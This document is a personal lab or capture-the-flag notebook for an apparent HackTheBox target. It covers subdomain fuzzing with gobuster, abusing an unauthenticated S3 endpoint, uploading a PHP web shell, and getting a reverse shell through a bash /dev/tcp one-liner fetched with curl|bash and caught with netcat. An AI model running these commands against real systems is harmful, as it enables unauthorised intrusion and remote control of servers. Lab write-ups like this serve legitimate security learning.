### 12.01.2023

Finding subdomains:
-> For some reason wfuzz is running mad slow on my PC, same wordlist work very fast with gobuster. Also
wfuzz do not even get the correct respons?
-> gobuster example: 

```
gobuster vhost -w ../../wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain -u http://thetoppers.htb
```

also, when running gobuster, the -u [URL] needs to be after the -w [wordlist], its stupide, but the 
first one did not work for me. NOTE: Remember to use --append-domain.

### 13.01.2023
Working with AWS S3 buckets:
Apparently we can use the AWS CLI tool without having real credentials, 
sometimes they only check is there is a value there. I sett all of them to temp.

Lising the buckets we also need to spesify the endpoint, example:
```
aws --endpoint=http://s3.thetoppers.htb s3 ls

or:

aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
```

  
### 14.01.2023
We have gained access to thetoppers.htb buckets, or the aws s3 service being hosted on the website.
I can see that there is nothing interessting information in it, but we we have the option to 
upload malicious files.

Getting a reverse shell:
```
<?php system($_GET["cmd"]); ?>
```

Uploading php shell file to the bucket. 
```
aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
```

### 15-16.01.2023
Uploading a reverse shell to a Amazone S3 bucket:

From the .PHP script we build and uploaded yesterday we can execute commands via CMD on the server using:
```
http://thetoppers.htb/shell.php?cmd=[command]
```

Then we make a bash shell for us to get a reverse shell on the server(Why could we not just use the .php shell?). We the new shell creates a connection to our ip on port 1337.

```
#!/bin/bash

bash -i >& /dev/tcp/<IP>/1337 0>&1

```

-i: Launches interactive Bash shell.



And upload this new .sh shell to the server, we will be executing this via the .php shell. 

Setting up a http server running from my PC, in the directory i have saved the new .sh shell: 

```
python3 -m http.server 8000
```

This hosts a http service, listening for incoming connections on port 8000. When clients connect to the service when would gain access to all the file contained in the directory where the service is hosted. 

Then we set up a listener with netcat on the port we specified in the .sh script. (the -l specifies the listening mode)
```
nc -nvlp 1337
```


When executing this in the browser:
```
http://thetoppers.htb/shell.php?cmd=curl%2010.10.15.233:8000/shell.sh|bash
```

we create execute the .sh shell and create a connection to our 1337 port, letting us execute code on their server from our terminal:

![[Pasted image 20240116201856.png]]
![[Pasted image 20240116201913.png]]



